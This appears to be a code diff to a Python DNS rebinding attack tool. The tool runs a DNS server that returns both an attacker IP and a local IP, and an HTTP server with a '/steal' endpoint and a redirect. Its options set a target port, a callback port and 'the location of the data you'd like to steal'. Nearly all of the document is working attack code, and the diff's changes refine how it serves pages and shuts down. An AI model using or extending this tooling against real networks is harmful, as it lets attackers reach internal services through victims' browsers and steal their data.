@@ -17,10 +17,6 @@ except ImportError:
     print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
     sys.exit(2)
 
-cs = None
-rs = None
-s = None
-
 class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
     pass
 
@@ -41,8 +37,9 @@ class rebindHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_header("Content-Type", "text/html")
             self.end_headers()
             f = open("parent.html")
-            resp = f.read().encode("utf-8")
+            resp = f.read().replace("{location}", str(args.location))
             f.close()
+            resp = resp.encode("utf-8")
             self.wfile.write(resp)
         elif self.path == "/steal":
             self.send_response(200)
@@ -58,11 +55,16 @@ class rebindHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_response(302)
             self.send_header("Location", args.location)
             self.end_headers()
+            try:
+                self.server.server_close()
+            except:
+                #This will error because we're in the thread we're terminating...
+                pass
         else:
             self.send_response(200)
             self.send_header("Content-Type", "text/html")
             self.end_headers()
-            self.wfile.write(b"<h1>Nope-o</h1>")
+            self.wfile.write(b"<h1>Nope</h1>")
 
 
 class BaseRequestHandler(socketserver.BaseRequestHandler):
@@ -74,15 +76,12 @@ class BaseRequestHandler(socketserver.BaseRequestHandler):
         raise NotImplementedError
 
     def handle(self):
-        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-        print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],self.client_address[1]))
         data = self.get_data()
         self.send_data(dns_response(data))
 
 
 class UDPRequestHandler(BaseRequestHandler):
     def get_data(self):
-        print(DNSRecord.parse(self.request[0].strip()))
         return self.request[0].strip()
 
     def send_data(self, data):
@@ -102,7 +101,7 @@ def dns_response(data):
     qname = request.q.qname
     reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(server)))
     reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(localip)))
-    print("---- Reply:\n", reply)
+    print(f"[DNS]: {dn} - A:{server}, A:{localip}")
     return reply.pack()
 
 
@@ -141,12 +140,10 @@ def main(args):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('target_ip')
     parser.add_argument('-p', '--port', help="Specify port to attack on targetIp.", default=80)
     parser.add_argument('-c', '--callback-port', help="Specify the callback HTTP server port.", default=31337)
     parser.add_argument('-d', '--dns-port', help="Specify the DNS server port.", default=53)
-    parser.add_argument('-f', '--file', help="Specify the HTML file to display in the first iframe.", default="steal.html")
+    parser.add_argument('-f', '--file', help="Specify the HTML file to display in the first iframe.(The \"steal\" iframe)", default="steal.html")
     parser.add_argument('-l', '--location', help="Specify the location of the data you'd like to steal on the target.", default="/")
     args = parser.parse_args()
-    print(args)
     main(args)
